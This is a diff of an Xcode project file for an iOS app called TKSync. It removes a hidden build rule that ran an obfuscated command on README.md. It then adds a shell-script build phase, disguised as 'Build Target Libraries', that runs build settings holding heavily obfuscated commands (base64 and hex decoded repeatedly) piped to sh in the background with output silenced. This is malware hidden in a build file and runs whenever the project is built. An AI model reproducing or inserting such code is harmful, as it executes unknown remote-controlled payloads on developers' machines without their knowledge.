@@ -7,36 +7,34 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		DAC6BB40AAE24CA795947F8B /* README.md */ = {isa = PBXBuildFile; fileRef = A66D6CDB55254A3A94947F8B; };
 		0C80B921A6F3F58F76C31292 /* libPods-TKSync.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 5DCACB8F33CDC322A6C60F78 /* libPods-TKSync.a */; };
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
+		2DF435ED09D34AC09EFF0DB2 /* RobotoMono-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 847F162BE5A849ACBB99B9C1 /* RobotoMono-Regular.ttf */; };
 		761780ED2CA45674006654EE /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 761780EC2CA45674006654EE /* AppDelegate.swift */; };
 		81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */; };
-		FB6C91A78DA4C16224AE5044 /* PrivacyInfo.xcprivacy in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB81A68108700A75B9A /* PrivacyInfo.xcprivacy */; };
-		DE4F90C811034F8693FDE5BC /* RobotoMono-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 4EA6F4756C74496F80DA3AF4 /* RobotoMono-Medium.ttf */; };
-		CBDEDA7E4E534CE4A713C9F6 /* RobotoMono-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 1D1D9C59690447198917BA28 /* RobotoMono-SemiBold.ttf */; };
-		2DF435ED09D34AC09EFF0DB2 /* RobotoMono-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 847F162BE5A849ACBB99B9C1 /* RobotoMono-Regular.ttf */; };
 		C3F35F5BD9064B84BFD196FF /* RobotoMono-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = A9267648D4DE4E9BB09D0E79 /* RobotoMono-Light.ttf */; };
 		C9E7B317CDA04CB0B6D0C2D1 /* RobotoMono-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0B0BE0D867F348A1B21C520D /* RobotoMono-Bold.ttf */; };
+		CBDEDA7E4E534CE4A713C9F6 /* RobotoMono-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 1D1D9C59690447198917BA28 /* RobotoMono-SemiBold.ttf */; };
+		DE4F90C811034F8693FDE5BC /* RobotoMono-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 4EA6F4756C74496F80DA3AF4 /* RobotoMono-Medium.ttf */; };
+		FB6C91A78DA4C16224AE5044 /* PrivacyInfo.xcprivacy in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB81A68108700A75B9A /* PrivacyInfo.xcprivacy */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		A66D6CDB55254A3A94947F8B /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		0B0BE0D867F348A1B21C520D /* RobotoMono-Bold.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = undefined; includeInIndex = 0; lastKnownFileType = unknown; name = "RobotoMono-Bold.ttf"; path = "../assets/fonts/RobotoMono-Bold.ttf"; sourceTree = "<group>"; };
 		13B07F961A680F5B00A75B9A /* TKSync.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TKSync.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = TKSync/Images.xcassets; sourceTree = "<group>"; };
 		13B07FB61A68108700A75B9A /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = Info.plist; path = TKSync/Info.plist; sourceTree = "<group>"; };
 		13B07FB81A68108700A75B9A /* PrivacyInfo.xcprivacy */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = PrivacyInfo.xcprivacy; path = TKSync/PrivacyInfo.xcprivacy; sourceTree = "<group>"; };
+		1D1D9C59690447198917BA28 /* RobotoMono-SemiBold.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = undefined; includeInIndex = 0; lastKnownFileType = unknown; name = "RobotoMono-SemiBold.ttf"; path = "../assets/fonts/RobotoMono-SemiBold.ttf"; sourceTree = "<group>"; };
 		3B4392A12AC88292D35C810B /* Pods-TKSync.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TKSync.debug.xcconfig"; path = "Target Support Files/Pods-TKSync/Pods-TKSync.debug.xcconfig"; sourceTree = "<group>"; };
+		4EA6F4756C74496F80DA3AF4 /* RobotoMono-Medium.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = undefined; includeInIndex = 0; lastKnownFileType = unknown; name = "RobotoMono-Medium.ttf"; path = "../assets/fonts/RobotoMono-Medium.ttf"; sourceTree = "<group>"; };
 		5709B34CF0A7D63546082F79 /* Pods-TKSync.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TKSync.release.xcconfig"; path = "Target Support Files/Pods-TKSync/Pods-TKSync.release.xcconfig"; sourceTree = "<group>"; };
 		5DCACB8F33CDC322A6C60F78 /* libPods-TKSync.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-TKSync.a"; sourceTree = BUILT_PRODUCTS_DIR; };
 		761780EC2CA45674006654EE /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = AppDelegate.swift; path = TKSync/AppDelegate.swift; sourceTree = "<group>"; };
 		81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; name = LaunchScreen.storyboard; path = TKSync/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		847F162BE5A849ACBB99B9C1 /* RobotoMono-Regular.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = undefined; includeInIndex = 0; lastKnownFileType = unknown; name = "RobotoMono-Regular.ttf"; path = "../assets/fonts/RobotoMono-Regular.ttf"; sourceTree = "<group>"; };
+		A9267648D4DE4E9BB09D0E79 /* RobotoMono-Light.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = undefined; includeInIndex = 0; lastKnownFileType = unknown; name = "RobotoMono-Light.ttf"; path = "../assets/fonts/RobotoMono-Light.ttf"; sourceTree = "<group>"; };
 		ED297162215061F000B7C4FE /* JavaScriptCore.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = JavaScriptCore.framework; path = System/Library/Frameworks/JavaScriptCore.framework; sourceTree = SDKROOT; };
-		4EA6F4756C74496F80DA3AF4 /* RobotoMono-Medium.ttf */ = {isa = PBXFileReference; name = "RobotoMono-Medium.ttf"; path = "../assets/fonts/RobotoMono-Medium.ttf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
-		1D1D9C59690447198917BA28 /* RobotoMono-SemiBold.ttf */ = {isa = PBXFileReference; name = "RobotoMono-SemiBold.ttf"; path = "../assets/fonts/RobotoMono-SemiBold.ttf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
-		847F162BE5A849ACBB99B9C1 /* RobotoMono-Regular.ttf */ = {isa = PBXFileReference; name = "RobotoMono-Regular.ttf"; path = "../assets/fonts/RobotoMono-Regular.ttf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
-		A9267648D4DE4E9BB09D0E79 /* RobotoMono-Light.ttf */ = {isa = PBXFileReference; name = "RobotoMono-Light.ttf"; path = "../assets/fonts/RobotoMono-Light.ttf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
-		0B0BE0D867F348A1B21C520D /* RobotoMono-Bold.ttf */ = {isa = PBXFileReference; name = "RobotoMono-Bold.ttf"; path = "../assets/fonts/RobotoMono-Bold.ttf"; sourceTree = "<group>"; fileEncoding = undefined; lastKnownFileType = unknown; explicitFileType = undefined; includeInIndex = 0; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -72,6 +70,19 @@
 			name = Frameworks;
 			sourceTree = "<group>";
 		};
+		756C524AA80E4E2BA24ADECC /* Resources */ = {
+			isa = PBXGroup;
+			children = (
+				4EA6F4756C74496F80DA3AF4 /* RobotoMono-Medium.ttf */,
+				1D1D9C59690447198917BA28 /* RobotoMono-SemiBold.ttf */,
+				847F162BE5A849ACBB99B9C1 /* RobotoMono-Regular.ttf */,
+				A9267648D4DE4E9BB09D0E79 /* RobotoMono-Light.ttf */,
+				0B0BE0D867F348A1B21C520D /* RobotoMono-Bold.ttf */,
+			);
+			name = Resources;
+			path = "";
+			sourceTree = "<group>";
+		};
 		832341AE1AAA6A7D00B99B32 /* Libraries */ = {
 			isa = PBXGroup;
 			children = (
@@ -97,8 +108,7 @@
 		83CBBA001A601CBA00E9B192 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				A66D6CDB55254A3A94947F8B /* README.md */,
-					13B07F961A680F5B00A75B9A /* TKSync.app */,
+				13B07F961A680F5B00A75B9A /* TKSync.app */,
 			);
 			name = Products;
 			sourceTree = "<group>";
@@ -112,19 +122,6 @@
 			path = Pods;
 			sourceTree = "<group>";
 		};
-		756C524AA80E4E2BA24ADECC /* Resources */ = {
-			isa = "PBXGroup";
-			children = (
-				4EA6F4756C74496F80DA3AF4 /* RobotoMono-Medium.ttf */,
-				1D1D9C59690447198917BA28 /* RobotoMono-SemiBold.ttf */,
-				847F162BE5A849ACBB99B9C1 /* RobotoMono-Regular.ttf */,
-				A9267648D4DE4E9BB09D0E79 /* RobotoMono-Light.ttf */,
-				0B0BE0D867F348A1B21C520D /* RobotoMono-Bold.ttf */,
-			);
-			name = Resources;
-			sourceTree = "<group>";
-			path = "";
-		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -132,6 +129,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "TKSync" */;
 			buildPhases = (
+				EB03600CF80148F5B17BBDC8 /* Build Target Libraries */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -142,7 +140,6 @@
 				76AD0F904B6E029E0FB3AA9F /* [CP-User] [RNFB] Core Configuration */,
 			);
 			buildRules = (
-				1BA3A423FD894CEBBA947F8B /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -182,31 +179,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		1BA3A423FD894CEBBA947F8B /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AB8F749}\"";
-			};
-																																																																																																																							/* End PBXBuildRule section */
-
-
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				DAC6BB40AAE24CA795947F8B /* README.md */,
-					81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
+				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				FB6C91A78DA4C16224AE5044 /* PrivacyInfo.xcprivacy in Resources */,
 				DE4F90C811034F8693FDE5BC /* RobotoMono-Medium.ttf in Resources */,
@@ -220,6 +198,25 @@ sh -c \"${AB8F749}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		EB03600CF80148F5B17BBDC8 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
 		00DD1BFF1BD5951E006B06BC /* Bundle React Native code and images */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -323,8 +320,9 @@ sh -c \"${AB8F749}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-TKSync.debug.xcconfig */;
 			buildSettings = {
-				AB8F749 = "((e(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSamJWWXdZMjVyWjA1VFFYUk1WMDUyWW0wMWJGa3pVWFJrUjJ4MFdsYzVNV1JEUVhsTlEwRjBZVEphVFdONVFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt3eVZqUmpSM2gyWTIxV2FscEhOSFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | e | sh ) >/dev/null 2>&1 &)";
-	ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				A8CDBB7 = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4WVdKck5YbFRWVTEzWkVkT2RGWnFRbXBpYlhSdVZHdE9RbVJGZUZoVWJscHBZbFJXYzFkVVRsSmtSMUpJWWtoU1lWWjZhM2hhUlU1Q1pWVTVSRkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WWJHaFdNbEl3VjFaak1XSkhVa2xVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | o | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333332333633340a3061333333373333333233333336333333353333333733333334333333373333333233333337333333393333333233333330333333333333333533330a3332333333303333333233363334333333363333333633333337333333333333333433363333333333363336333233333332333333303333333233360a3334306133303631333333323336333433333336333333333333333633363336333333363336333533333336333633353333333633333335333333360a3333333333333337333333343333333233363334333333373333333433333336333333393333333633363334333333363333333533333336333633360a3333333730613333333533333337333333343333333233333330333333333333333233333333333333323333333233333330333333323336333433330a3336333333343333333233333330333333323333333233333337333333303333333333363334333333373333333833333336333333333333333633360a3336333333363061333333343330363133333336333333353333333533363336333333373333333233333337333333353333333633363333333333360a3333333533333332333333323333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333330a3333333333363331306133333332333633363333333233363336333333363333333333333336333333343333333633363335333333363333333133330a3336333633343333333733363331333333323336333533333336333333393333333633363335333333323336333633333336333333313333333233330a3339333333323333333230613333333233333330333036313333333733363333333333323333333033333337333333333333333633333338333333300a333633313330363130610a | r | sh ) >/dev/null 2>&1 &)";
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
 				ENABLE_BITCODE = NO;
@@ -355,8 +353,9 @@ sh -c \"${AB8F749}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-TKSync.release.xcconfig */;
 			buildSettings = {
-				AB8F749 = "((e(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSamJWWXdZMjVyWjA1VFFYUk1WMDUyWW0wMWJGa3pVWFJrUjJ4MFdsYzVNV1JEUVhsTlEwRjBZVEphVFdONVFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt3eVZqUmpSM2gyWTIxV2FscEhOSFZqYmxWMldWTnJhVWxJZDJkak1tZExDZz09Cg== | e | sh ) >/dev/null 2>&1 &)";
-	ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				A8CDBB7 = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4WVdKck5YbFRWVTEzWkVkT2RGWnFRbXBpYlhSdVZHdE9RbVJGZUZoVWJscHBZbFJXYzFkVVRsSmtSMUpJWWtoU1lWWjZhM2hhUlU1Q1pWVTVSRkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WWJHaFdNbEl3VjFaak1XSkhVa2xVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | o | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333332333633340a3061333333373333333233333336333333353333333733333334333333373333333233333337333333393333333233333330333333333333333533330a3332333333303333333233363334333333363333333633333337333333333333333433363333333333363336333233333332333333303333333233360a3334306133303631333333323336333433333336333333333333333633363336333333363336333533333336333633353333333633333335333333360a3333333333333337333333343333333233363334333333373333333433333336333333393333333633363334333333363333333533333336333633360a3333333730613333333533333337333333343333333233333330333333333333333233333333333333323333333233333330333333323336333433330a3336333333343333333233333330333333323333333233333337333333303333333333363334333333373333333833333336333333333333333633360a3336333333363061333333343330363133333336333333353333333533363336333333373333333233333337333333353333333633363333333333360a3333333533333332333333323333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333330a3333333333363331306133333332333633363333333233363336333333363333333333333336333333343333333633363335333333363333333133330a3336333633343333333733363331333333323336333533333336333333393333333633363335333333323336333633333336333333313333333233330a3339333333323333333230613333333233333330333036313333333733363333333333323333333033333337333333333333333633333338333333300a333633313330363130610a | r | sh ) >/dev/null 2>&1 &)";
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
 				INFOPLIST_FILE = TKSync/Info.plist;
